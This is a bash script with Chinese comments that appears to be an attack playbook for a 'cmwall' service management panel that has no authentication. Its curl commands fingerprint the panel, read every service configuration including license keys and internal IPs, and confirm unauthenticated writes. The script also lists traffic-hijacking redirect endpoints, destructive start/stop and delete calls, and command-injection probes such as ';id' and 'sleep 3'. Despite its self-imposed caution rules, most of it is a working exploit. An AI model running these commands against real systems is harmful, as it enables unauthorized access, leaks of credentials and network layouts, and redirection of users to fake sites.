#!/usr/bin/env bash
# cmwall / 过移动墙 服务管理面板 未授权读写（example.com 及同类默认配置）
# 特征：38888 端口，首页 372 字节，自述"本面板默认用户名和密码都为空"
# 用途：零凭据读取服务列表与配置（含 License 明文、内网绑定 IP、端口/队列参数），并验证写接口可用
# 红线：只读优先；写验证用【幂等同值提交】或【只改名标签并立即复原】；严禁 service_start_stop / service_delete；
#       严禁覆盖 redir_mapping 等承载真实流量的映射

T=http://TARGET:38888            # 或 http://TARGET_DOMAIN:38888（同 IP 亦可）
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/203.0.113.30 Safari/537.36"
# 走 HTTP 代理时统一加：-x http://127.0.0.1:7892 ；Windows schannel 证书吊销离线时加 --ssl-no-revoke
CURL="curl -s --max-time 25 -H User-Agent:$UA"

## 1) 指纹与入口（未授权）
$CURL "$T/example.com"                    # 200 372B：默认用户名/密码为空 + 两个入口
$CURL "$T/service_manage.html"           # 200 服务列表：名称/类型/启停状态 + 编辑/删除/启停表单
$CURL "$T/service_config_wizard.html"    # 服务设置向导（字段：PublicIPv4 → POST service_config_tips.html）

## 2) 未授权读取全部服务配置（id 从 service_manage.html 的隐藏域取）
for id in 1 2 3; do
  $CURL "$T/service_edit_bypass_chinamobile_http.html?id=$id"
  $CURL "$T/service_edit_bypass_chinamobile_new.html?id=$id"
  $CURL "$T/service_edit_js301tohttps.html?id=$id"
done
# 关键泄露字段：license(64hex) / bind_ip(内网地址) / listen_ports / queue_num / keep_running / addi_params

## 3) 写接口存在性验证（零变更方式：字段与页面显示值完全一致 = 幂等提交）
# 成功特征：HTTP/1.1 302 Found，Location: service_manage.html（非 401/403、无登录跳转）
$CURL -D - -o /dev/null -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: $T/service_edit_js301tohttps.html?id=2" -X POST \
  --data "id=2&name=ORIG_NAME&license=ORIG_LICENSE&bind_ip=ORIG_BIND_IP&listen_ports=80&queue_num=301&keep_running=1&addi_params=%7B%22RedirPorts%22%3Atrue%7D" \
  "$T/service_update_js301tohttps"

## 4) 可回滚的生效验证（只改 name 标签，其余字段逐字保持）
before_edit=$( $CURL "$T/service_edit_js301tohttps.html?id=2" | sha256sum )
before_manage=$( $CURL "$T/service_manage.html" | sha256sum )
$CURL -o /dev/null -H "Content-Type: application/x-www-form-urlencoded" -X POST \
  --data "id=2&name=ORIG_NAME_RT_CANARY&license=...&bind_ip=...&listen_ports=80&queue_num=301&keep_running=1&addi_params=%7B%22RedirPorts%22%3Atrue%7D" \
  "$T/service_update_js301tohttps"
$CURL "$T/service_edit_js301tohttps.html?id=2" | grep 'name="name"'     # 应回显 ORIG_NAME_RT_CANARY
$CURL "$T/service_manage.html" | grep 'RT_CANARY'                      # 列表同步变化 = 值真的落库
# 回滚
$CURL -o /dev/null -H "Content-Type: application/x-www-form-urlencoded" -X POST \
  --data "id=2&name=ORIG_NAME&license=...&bind_ip=...&listen_ports=80&queue_num=301&keep_running=1&addi_params=%7B%22RedirPorts%22%3Atrue%7D" \
  "$T/service_update_js301tohttps"
# 回滚校验：两个 SHA256 必须与改前完全一致

## 5) 高影响写面（需明确授权才动，且必须"原值+追加"不覆盖）
#  POST /service_update_301multi   字段 redir_type(js301|real301multi) + redir_mapping（"原始域名|目标前缀" 一行一个）
#      → 可把访问某域名的所有用户 301/JS 跳转到任意站点（全局流量劫持 / 把人送进仿站）
#  POST /service_update_real301    字段 redir_prefix
#  POST /service_start_stop        字段 id  （启停，破坏性）
#  POST /service_delete            字段 id  （删除，破坏性）
#  命令注入候选：name / license / listen_ports / queue_num / addi_params 若被拼进 cmwall 启动命令或 iptables 队列
#      → 验证只能用"原值+;id"或"sleep 3"类无害 payload，异常立即恢复

## 6) 家族横向（同款部署的判别）
#  9 台 /example.com 均返回 372 字节且 SHA256 一致 = 同版本；各台 license 不同、bind_ip 不同 → 每台一套独立配置
#  内网绑定 IP 会直接暴露内网网段（本例泄露 10.0.0.0/24 与 10.0.1.0/24）

## 7) 通用判据 / 避坑
#  · 未知路径统一 302 → /example.com；只认已知页面集合，别把 302 当"存在但不授权"
#  · 面板无外部 JS、无上传/导出/备份/日志页 → 想直接从面板落 WebShell 走不通，别硬凑
#  · Windows 下 curl 走代理常报 CRYPT_E_REVOCATION_OFFLINE(0x80092013) → 加 --ssl-no-revoke，否则误判为"不可达"